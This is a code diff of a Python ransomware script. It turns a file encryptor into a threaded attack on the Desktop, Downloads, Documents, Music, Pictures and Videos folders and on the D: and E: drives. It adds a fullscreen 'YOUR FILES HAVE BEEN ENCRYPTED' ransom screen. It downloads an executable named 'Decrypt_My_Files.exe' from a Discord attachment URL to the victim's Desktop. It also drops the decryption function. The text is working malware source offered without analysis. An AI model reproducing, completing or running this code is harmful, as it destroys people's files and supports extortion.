@@ -1,14 +1,29 @@
-import os, base64, string, random
+import json
+import os 
+import random
+import string
+import base64
+import urllib.request
+import urllib
+import tkinter as tk
+from threading import *
+from time import *
+from tkinter import *
+from ctypes import *
+from urllib.request import urlopen
+from time import sleep
 from cryptography.fernet import Fernet as f
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+global appdata
+appdata = os.getenv('APPDATA')
 
-#region Functions
+
 def password(passwd):
     
-    password = passwd.encode() # Convert to type bytes
-    salt = b'salt_' # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
+    password = passwd.encode() 
+    salt = b'salt_' 
     kdf = PBKDF2HMAC(
     algorithm=hashes.SHA256(),
     length=32,
@@ -18,8 +33,6 @@ def password(passwd):
             )
     k = base64.urlsafe_b64encode(kdf.derive(password))
     return k
-
-
 
 def enc_fun(key,file):
     try:
@@ -34,21 +47,49 @@ def enc_fun(key,file):
     except:
         pass
 
+def spam_messagebox():
 
-def dec_fun(key,file):
-    try:        
-        with open(file, "rb") as fname:
-            data = fname.read()
-        fkey = f(key)
-        fl,ext = os.path.splitext(file)
-        dec = fkey.decrypt(data)
-        with open(str(fl[0:]), 'wb') as decfile:
-            decfile.write(dec)
-        os.remove(file)
-    
-    except:
-        pass
-#endregion
+    root= tk.Tk()
+    width = root.winfo_screenwidth() 
+    height = root.winfo_screenheight() 
+
+
+    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') 
+    canvas1.pack()
+
+    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') 
+    label1.config(font=('helvetica', int(height/20)))
+    label1.config(background='black', foreground='red')
+    canvas1.create_window(int(width/2), int(height/15), window=label1)
+
+
+    label1 = tk.Label(root, text='YOUR IMPORTANT PROGRAMS, DOCUMENTS, DATAS, PHOTOS, SCRIPTS, SOURCE CODE AND VIDEOS') 
+    label1.config(font=('helvetica', int(height/50)))
+    label1.config(background='black', foreground='red')
+    canvas1.create_window(int(width/2), int(height/20)*6, window=label1)
+
+
+    label1 = tk.Label(root, text='HAVE BEEN ENCRYPTED WITH HIGH GRADE MILITARY ENCRYPTION.') 
+    label1.config(font=('helvetica', int(height/50)))
+    label1.config(background='black', foreground='red')
+    canvas1.create_window(int(width/2), int(height/20)*7, window=label1)
+
+    root.attributes('-topmost', True) 
+    root.attributes('-fullscreen', True) 
+    root.mainloop()
+
+def download_decrypter():
+    NAME = os.getlogin()
+    req = urllib.request.Request('https://cdn.discordapp.com/attachments/947224575622676520/966006697120378880/Decrypt_My_Files.exe', headers={'User-Agent': 'Mozilla/5.0'})
+    f = urlopen(req)
+    filecontent = f.read()
+    with open(f'C:\\Users\\{NAME}\\Desktop\\Decrypt_My_Files.exe', 'wb') as f:
+        f.write(filecontent)
+    f.close()
+
+
+
+PASSWORDS = []
 
 # Encrypt C: Items, Desktop, Downloads, Documents, Pictures etc...
 def C_drive_desktop():
@@ -70,13 +111,13 @@ def C_drive_desktop():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        #Mac/Linux system directory
+                        
                         '/usr',  
                         '/Library/',
                         '/System',
                         '/Applications',
                         '.Trash',
-                        #Windows system directory
+                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -118,8 +159,8 @@ def C_drive_desktop():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            
-            C_drive_downloads()
+            lol = 'Desktop Folder : '
+            PASSWORDS.append(f"{lol}{passwd}")
         else:
             shit = 420
     else:
@@ -144,13 +185,13 @@ def C_drive_downloads():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        #Mac/Linux system directory
+                        
                         '/usr',  
                         '/Library/',
                         '/System',
                         '/Applications',
                         '.Trash',
-                        #Windows system directory
+                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -192,8 +233,8 @@ def C_drive_downloads():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            
-            C_drive_documents()
+            lol = 'Downloads Folder : '
+            PASSWORDS.append(f"{lol}{passwd}")
         else:
             shit = 420
     else:
@@ -218,13 +259,13 @@ def C_drive_documents():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        #Mac/Linux system directory
+                        
                         '/usr',  
                         '/Library/',
                         '/System',
                         '/Applications',
                         '.Trash',
-                        #Windows system directory
+                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -266,8 +307,8 @@ def C_drive_documents():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            
-            C_drive_music()
+            lol = 'Documents Folder : '
+            PASSWORDS.append(f"{lol}{passwd}")
         else:
             shit = 420
     else:
@@ -292,13 +333,13 @@ def C_drive_music():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        #Mac/Linux system directory
+                        
                         '/usr',  
                         '/Library/',
                         '/System',
                         '/Applications',
                         '.Trash',
-                        #Windows system directory
+                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -340,8 +381,8 @@ def C_drive_music():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            
-            C_drive_pictures()
+            lol = 'Music Folder : '
+            PASSWORDS.append(f"{lol}{passwd}")
         else:
             shit = 420
     else:
@@ -366,13 +407,13 @@ def C_drive_pictures():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        #Mac/Linux system directory
+                        
                         '/usr',  
                         '/Library/',
                         '/System',
                         '/Applications',
                         '.Trash',
-                        #Windows system directory
+                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -414,8 +455,8 @@ def C_drive_pictures():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-
-            C_drive_videos()
+            lol = 'Pictures Folder : '
+            PASSWORDS.append(f"{lol}{passwd}")
         else:
             shit = 420
     else:
@@ -440,13 +481,13 @@ def C_drive_videos():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        #Mac/Linux system directory
+                        
                         '/usr',  
                         '/Library/',
                         '/System',
                         '/Applications',
                         '.Trash',
-                        #Windows system directory
+                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -488,15 +529,14 @@ def C_drive_videos():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-
-            D_drive()
+            lol = 'Videos Folder : '
+            PASSWORDS.append(f"{lol}{passwd}")
         else:
             shit = 420
     else:
         shit = 420
 
-
-# Try to encrypt D: drive
+    # Other Drives
 def D_drive():
     userdir = f'D:\\'
     listOfFiles = list()
@@ -516,13 +556,13 @@ def D_drive():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        #Mac/Linux system directory
+                        
                         '/usr',  
                         '/Library/',
                         '/System',
                         '/Applications',
                         '.Trash',
-                        #Windows system directory
+                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -564,16 +604,13 @@ def D_drive():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            
-            E_drive()
+            lol = 'D Drive : '
+            PASSWORDS.append(f"{lol}{passwd}")
         else:
             shit = 420
     else:
-        E_drive()
         shit = 420
 
-
-# Try to encrypt E: drive
 def E_drive():
     userdir = f'E:\\'
     listOfFiles = list()
@@ -593,13 +630,13 @@ def E_drive():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        #Mac/Linux system directory
+                        
                         '/usr',  
                         '/Library/',
                         '/System',
                         '/Applications',
                         '.Trash',
-                        #Windows system directory
+                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -641,10 +678,48 @@ def E_drive():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            
+            lol = 'E Drive : '
+            PASSWORDS.append(f"{lol}{passwd}")
         else:
             shit = 420
     else:
         shit = 420
 
-# Try to encrypt F: drive
+def Start_ransom():
+    print("Booting up auto encrypter, Please wait. . .")
+
+    a = Thread(target = C_drive_desktop)
+    b = Thread(target = C_drive_downloads)
+    c = Thread(target = C_drive_documents)
+    d = Thread(target = C_drive_music)
+    e = Thread(target = C_drive_pictures)
+    f = Thread(target = C_drive_videos)
+    g = Thread(target = D_drive)
+    h = Thread(target = E_drive)
+
+    download = Thread(target = download_decrypter)
+    message = Thread(target = spam_messagebox)
+
+    a.start()
+    b.start()
+    c.start()
+    d.start()
+    e.start()
+    f.start()
+    g.start()
+    h.start()
+    download.start()
+    message.start()
+
+    a.join()
+    b.join()
+    c.join()
+    d.join()
+    e.join()
+    f.join()
+    g.join()
+    h.join()
+    download.join()
+    message.join()
+
+print(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
